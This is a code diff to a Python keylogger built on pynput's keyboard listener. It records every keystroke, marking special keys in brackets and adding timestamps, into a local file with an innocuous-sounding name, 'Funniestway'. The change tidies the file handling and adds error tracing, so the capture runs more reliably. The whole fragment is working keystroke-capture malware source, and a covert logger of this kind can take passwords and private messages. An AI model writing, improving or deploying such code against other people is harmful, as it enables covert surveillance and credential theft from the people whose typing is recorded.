@@ -1,6 +1,7 @@
 from pynput import keyboard
 import datetime
 import sys
+import traceback
 
 win2 = []
 closing = {'e': False,
@@ -36,24 +37,22 @@ def Add(key):
     global start
     global win2
     try:
-        o = open('Funniestway', 'a+')
-    except:
-        o = open('Funniestway','a+')
-    finally:
-        readed = o.read()
-        if start:
-            if readed != '':
-                readed = readed + '\n' + str(datetime.datetime.now()) + '\n'
-            else:
-                readed = '\n' + str(datetime.datetime.now()) + '\n'
-            start = False
-        if len(key) > 1:
-            if key != 'space':
-                key = key.replace(key,f' [{key}] ')
-            else:
-                key = key.replace(key,' ')
-
-        o.write(readed + key)
+        with open('Funniestway.txt', 'a+') as o:
+            readed = o.read()
+            if start:
+                if readed != '':
+                    readed = readed + '\n' + str(datetime.datetime.now()) + '\n'
+                else:
+                    readed = '\n' + str(datetime.datetime.now()) + '\n'
+                start = False
+            if len(key) > 1:
+                if key != 'space':
+                    key = key.replace(key,f' [{key}] ')
+                else:
+                    key = key.replace(key,' ')
+            o.write(readed + key)
+    except Exception as e:
+        traceback.print_exc()
 
 
 
